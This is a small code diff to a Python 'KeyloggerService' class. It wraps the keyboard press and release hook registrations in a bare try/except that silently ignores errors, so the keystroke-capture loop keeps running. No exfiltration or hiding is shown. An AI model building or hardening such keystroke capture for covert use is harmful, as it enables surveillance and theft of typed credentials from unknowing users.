@@ -25,8 +25,11 @@ class KeyloggerService:
     def _start(self) -> None:
         self.__change_action()
         while self.__action:
-            keyboard.on_press(self.__on_press)
-            keyboard.on_release(self.__add_on_release)
+            try:
+                keyboard.on_press(self.__on_press)
+                keyboard.on_release(self.__add_on_release)
+            except:
+                pass
             time.sleep(0.1)
 
     def __change_action(self):
